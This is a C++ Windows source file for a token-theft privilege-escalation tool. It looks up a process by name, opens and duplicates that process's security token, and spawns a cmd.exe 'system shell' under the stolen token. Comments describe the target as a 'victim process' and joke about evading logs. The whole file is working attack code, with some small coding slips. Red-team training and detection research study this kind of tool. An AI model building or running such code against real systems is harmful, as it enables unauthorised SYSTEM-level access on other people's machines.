#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>

DWORD GetProcId(const char* procName)
{
    //Set to default value of zero meaning your process is not found
    DWORD proc_id = 0;

    //Get a snapshot of running processes
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    //if your snapshot of processes handle isn't garbage iterate over them
    if (snap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 proc_entry;
        proc_entry.dwSize = sizeof(proc_entry);

        if (Process32First(snap, &proc_entry))
        {
            do
            {
                //string insensitive compare of the process.exe name vs what we supplied
                if (!_stricmp(proc_entry.szExeFile, procName))
                {
                    proc_id = proc_entry.th32ProcessID;
                    break;
                }
            } while (Process32Next(snap, &proc_entry));
        }
    }
    //clean up your handle and return the PID
    CloseHandle(snap);
    return proc_id;
}

HANDLE GetToken(DWORD pid)
{
    HANDLE proc = {};
    HANDLE token = {};

    if (pid == 0)
    {
        std::cout << "[!] No PID supplied Exiting" << std::endl;
        return (HANDLE)NULL;
    }
    else
    {
        //Open the process with Query info to the target so we can read the security token, 
        //set handle property inheritance to 1 so we assume the ID of the target process in our handle
        //pid is a DWORD PID of the victim process we will use to elevate
        proc = OpenProcess(PROCESS_QUERY_INFORMATION, 1, pid);
        if (proc != INVALID_HANDLE_VALUE)
        {
            std::cout << "[*] Opened handle to PID: " << pid << std::endl;
            //We need to grab info about the security tokens the process has
            //create a pointer to the process token you are trying to use to spawn a new process
            //PHANDLE is a typedef of *HANDLE
            HANDLE token = new HANDLE;

            //Open the process, and grab a pointer to the security token and store in the pToken var
            //https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera?redirectedfrom=MSDN
            //Store success in tokenResult
            BOOL token_result = OpenProcessToken(proc, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &token);
            if (token_result)
            {
                std::cout << "[*] Opened process token for PID: " << pid << std::endl;
                return token;
            }
            else
            {
                std::cout << "[!] Unable to open process token for PID: " << pid << " Error: " << GetLastError() << std::endl;
                return (HANDLE)NULL;
            }
        }
        else
        {
            std::cout << "[!] Unable to open handle to PID: " << pid << " Error: " << GetLastError() << std::endl;
            return (HANDLE)NULL;
        }
    }
    return (HANDLE)NULL;
}

BOOL SpawnSystemShell(HANDLE token, DWORD pid)
{
    if (token != NULL)
    {
        //Sets the level to "2" allowing you to impersonate on local machines
        SECURITY_IMPERSONATION_LEVEL level = SecurityImpersonation;
        //We stole a primary token
        TOKEN_TYPE type = TokenPrimary;
        //New handle object to copy the attributes from the remote process handle, this will give us control over the new token
        HANDLE dupd_token = new HANDLE;

        //Duplicate the remote token to our newly owned token
        BOOL dup_result = DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, level, type, &dupd_token);
        if (dup_result)
        {
            std::cout << "[*] Token from: " << pid << " Duplicated" << std::endl;

            //Specifies the window station, desktop, standard handles, and appearance of the main window for a process at creation time.
            //We don't care, so leave it blank
            STARTUPINFOW start_info = {};

            //Holds info about process after its started and handles to the process
            //if the child process dies but this parent process is still running the handles will not be cleaned up
            //Shouldn't have to worry too much about dangling handles since the parent process always terminates and the handles get cleaned up there
            PROCESS_INFORMATION proc_info = {};

            //Create a process with the duplicated token, this needs to be the actual value of the token and not a pointer to a token, if you use PHANDLE you need to dereference the pointer
            //Uses login type 3 to spawn a new session (if you are looking for logs ;) )
            //you could technically spawn anything at this point but a CMD prompt is the easiest to work with and guarenteed to be there
            //We don't need any command line parameters. 16bit applications need to be launched from the command line arguments section in array spot 0
            //https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags
            std::cout << "[*] Attempting to Spawn new system shell... " << std::endl;
            BOOL start_result = CreateProcessWithTokenW(dupd_token, LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &start_info, &proc_info);
            if (!start_result)
            {
                std::cout << "[!] Failed to start elevated proccess Error: " << GetLastError() << std::endl;
                return 1;
            }
            else
            {
                std::cout << "[*] Success! " << std::endl;
            }
        }
        else
        {
            std::cout << "[!] Token from: " << pid << " Not Duplicated Error: " << " " << GetLastError() << std::endl;
            return 1;
        }
    }
    else
    {
        std::cout << "[!] NULL Token Provided: " << pid << " Not Duplicated Error: " << " " << GetLastError() << std::endl;
        return 1;
    }
}